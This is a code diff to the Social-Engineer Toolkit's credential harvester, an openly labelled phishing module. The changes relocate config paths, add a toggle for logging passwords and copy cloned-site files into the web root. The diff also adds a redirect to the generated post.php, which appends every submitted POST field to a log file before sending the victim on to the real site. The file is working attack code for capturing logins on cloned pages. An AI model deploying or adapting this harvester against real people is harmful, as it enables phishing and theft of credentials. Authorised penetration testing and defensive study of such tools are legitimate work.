@@ -21,10 +21,12 @@ sys.path.append(definepath)
 
 from src.core.setcore import *
 
-from config.set_config import APACHE_SERVER as apache_check
-from config.set_config import WEBATTACK_EMAIL as webattack_email
-from config.set_config import TRACK_EMAIL_ADDRESSES as track_email
-from config.set_config import HARVESTER_LOG as logpath
+sys.path.append("/etc/setoolkit")
+from set_config import APACHE_SERVER as apache_check
+from set_config import WEBATTACK_EMAIL as webattack_email
+from set_config import TRACK_EMAIL_ADDRESSES as track_email
+from set_config import HARVESTER_LOG as logpath
+sys.path.append(definepath)
 
 if track_email == True:
     print_status("You have selected to track user accounts, Apache will automatically be turned on to handle tracking of users.")
@@ -73,7 +75,7 @@ except: import src.webattack.harvester.scraper
 
 # GRAB DEFAULT PORT FOR WEB SERVER AND CHECK FOR COMMAND CENTER
 command_center="off"
-fileopen=file("config/set_config" , "r").readlines()
+fileopen=file("/etc/setoolkit/set.config" , "r").readlines()
 counter=0
 for line in fileopen:
     line=line.rstrip()
@@ -103,8 +105,8 @@ for line in fileopen:
         counter=1
 
 # this checks the set_config to see if we need to redirect to a different website instead of the one cloned
-harvester_redirect = check_config("HARVESTER_REDIRECT=").lower()
-if harvester_redirect == "on":
+harvester_redirect = check_config("HARVESTER_REDIRECT=")
+if harvester_redirect.lower() == "on":
     URL = check_config("HARVESTER_URL=")
     counter = 1
 
@@ -114,7 +116,7 @@ if counter== 0: URL=''
 ssl_flag="false"
 self_signed="false"
 # SEE IF WE WANT TO USE SSL
-fileopen=file("config/set_config" , "r").readlines()
+fileopen=file("/etc/setoolkit/set.config" , "r").readlines()
 for line in fileopen:
     line=line.rstrip()
     match=re.search("WEBATTACK_SSL=ON", line)
@@ -287,7 +289,12 @@ class SETHandler(BaseHTTPRequestHandler):
                 counter=1
             match2=re.search("pwd|pass|uid|uname|Uname|userid|userID|USER|USERNAME|PIN|pin|password|Password|secret|Secret|Pass",line)
             if match2:
-                print bcolors.RED+"POSSIBLE PASSWORD FIELD FOUND: "+line+"\r" + bcolors.GREEN
+                # if you don't want to capture a password, turn this off, note not an exact science
+                log_password = check_config("HARVESTER_LOG_PASSWORDS=")
+                if log_password.lower() == "on":
+                    print bcolors.RED+"POSSIBLE PASSWORD FIELD FOUND: "+line+"\r" + bcolors.GREEN
+                else:
+                    line = ""
                 counter=1
             filewrite.write(cgi.escape("PARAM: "+line+"\n"))
             filewrite2.write(line+"\n")
@@ -318,8 +325,8 @@ class SETHandler(BaseHTTPRequestHandler):
             if counter== 0: URL=''
 
         # this checks the set_config to see if we need to redirect to a different website instead of the one cloned
-        harvester_redirect = check_config("HARVESTER_REDIRECT=").lower()
-        if harvester_redirect == "on":
+        harvester_redirect = check_config("HARVESTER_REDIRECT=")
+        if harvester_redirect.lower() == "on":
             RAW_URL = check_config("HARVESTER_URL=")
             counter = 1
 
@@ -424,20 +431,34 @@ def run():
         try:
 
             apache_dir = check_config("APACHE_DIRECTORY=")
+	    if os.path.isdir(apache_dir + "/html"): apache_dir = apache_dir + "/html"
             print bcolors.GREEN + "Apache webserver is set to ON. Copying over PHP file to the website."
         except Exception, e:
                 print e 
-                pause = raw_input("TEST")
         print "Please note that all output from the harvester will be found under apache_dir/harvester_date.txt"
         print "Feel free to customize post.php in the %s directory" % (apache_dir) + bcolors.ENDC
         filewrite = file("%s/post.php" % (apache_dir), "w")
         now=datetime.datetime.today()
-        filewrite.write("""<?php $file = 'harvester_%s.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?>""" % (now))
+        filewrite.write("""<?php $file = 'harvester_%s.txt';file_put_contents($file, print_r($_POST, true), FILE_APPEND);?><meta http-equiv="refresh" content="0; url=%s" />""" % (now, RAW_URL))
         filewrite.close()
         filewrite = file("%s/harvester_%s.txt" % (logpath,now), "w")
         filewrite.write("")
         filewrite.close()
-        subprocess.Popen("chown www-data:www-data '%s/harvester_%s.txt'" % (logpath,now), shell=True).wait()
+
+        # Check sys platform to perform chown
+        if sys.platform == "darwin":
+            subprocess.Popen("chown _www:_www '%s/harvester_%s.txt'" % (logpath,now), shell=True).wait()
+        else:
+            subprocess.Popen("chown www-data:www-data '%s/harvester_%s.txt'" % (logpath,now), shell=True).wait()
+
+        # if we are using webjacking, etc.
+        if os.path.isfile(setdir + "/web_clone/index2.html"):
+            # need to copy the files over - remove the old one first if there
+            if os.path.isfile(apache_dir + "/index2.html"):
+                os.remove(apache_dir + "/index2.html")
+
+            shutil.copyfile(setdir + "/web_clone/index2.html", apache_dir + "/index2.html")
+
         # here we specify if we are tracking users and such
         if track_email == True:
             fileopen = file (setdir + "/web_clone/index.html", "r")
@@ -448,6 +469,9 @@ def run():
             filewrite.close()
             os.remove(setdir + "/web_clone/index.html")
             shutil.copyfile(setdir + "/web_clone/index.2", setdir + "/web_clone/index.html")
+            # copy the entire web_clone directory.  
+            # Without this only index.php|html are copied even though the user may have chosen to import the entire directory in the set module.
+            copyfolder(setdir + "/web_clone", apache_dir)
         if os.path.isfile("%s/index.html" % (apache_dir)):
             os.remove("%s/index.html" % (apache_dir))
         if track_email == False:
@@ -527,7 +551,7 @@ if apache_check == False:
 
 if attack_vector != "multiattack":
     if apache_check == False:
-        print bcolors.BLUE+"[*] The Social-Engineer Toolkit Credential Harvester Attack\r\n[*] Credential Harvester is running on port "+web_port+"\r"
+        print bcolors.BLUE+"[*] The Social-Engineer Toolkit Credential Harvester Attack\r\n[*] Credential Harvester is running on port "+web_port+"\r"        
         print "[*] Information will be displayed to you as it arrives below:\r" + bcolors.ENDC
     else:
         print bcolors.BLUE+"[*] Apache is set to ON - everything will be placed in your web root directory of apache."
